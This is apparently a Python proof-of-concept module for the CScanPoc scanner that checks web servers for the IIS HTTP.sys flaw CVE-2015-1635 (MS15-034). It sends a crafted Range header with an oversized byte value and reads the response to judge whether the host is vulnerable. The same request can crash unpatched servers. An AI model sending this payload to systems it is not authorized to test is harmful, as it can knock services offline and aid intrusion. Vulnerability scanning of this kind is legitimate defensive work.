# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import socket
import random
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Microsoft-IIS_0001_p'  # 平台漏洞编号，留空
    name = 'Microsoft-IIS HTTP.sys 远程代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-04-14'  # 漏洞公布时间
    desc = '''
        远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。
        若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，安装更新可以修复此漏洞。
    '''  # 漏洞描述
    ref = 'https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034'  # 漏洞来源
    cnvd_id = 'CNVD-2015-02422'  # cnvd漏洞编号
    cve_id = 'CVE-2015-1635'  # cve编号
    product = 'Microsoft-IIS'  # 漏洞应用名称
    product_version = '''
        Windows7
        Windows8
        Windows server 2008
        Windows server 2012'''  # 漏洞应用版本


def _init_user_parser(self):  # 定制命令行参数
    self.user_parser.add_option('-p', '--port',
                                action='store', dest='port', type=int, default=80,
                                help='request port.')
    self.user_parser.add_option('--timeout',
                                action='store', dest='timeout', type=int, default=5,
                                help='request timeout.')


class Poc(ABPoc):
    poc_id = 'b511340b-8b3e-4480-84a3-a66a71ac08ea'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 获取地址、端口、超时时间
            #target = args['options']['target']
            #port = args['options']['port']
            #timeout = args['options']['timeout']

            o = urllib.parse.urlparse(self.target)
            port = o.port if o.port else 80
            target = o.hostname

            headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            }
            timeout = 5

            if port == 443:
                url = 'https://%s:%d' % (target, port)
            else:
                url = 'http://%s:%d' % (target, port)

            r = requests.get(url, verify=False,
                             headers=headers, timeout=timeout)
            if not r.headers.get('server') or "Microsoft" not in r.headers.get('server'):
                pass
                return None

            hexAllFfff = '18446744073709551615'
            headers.update({
                'Host': 'stuff',
                'Range': 'bytes=0-' + hexAllFfff,
            })
            r = requests.get(url, verify=False,
                             headers=headers, timeout=timeout)
            if "Requested Range Not Satisfiable" in r.text:
                # print "[+] Looks Vulnerability!"
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                #args['success'] = True
                #args['poc_ret']['vulnerability'] = '%s:%d' % (target, port)
            elif "The request has an invalid header name" in r.text:
                #args['poc_ret']['error'] = "[-] Looks Patched"
                pass
            else:
                #args['poc_ret']['error'] = "[-] Unexpected response, cannot discern patch status"
                pass
            return None

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
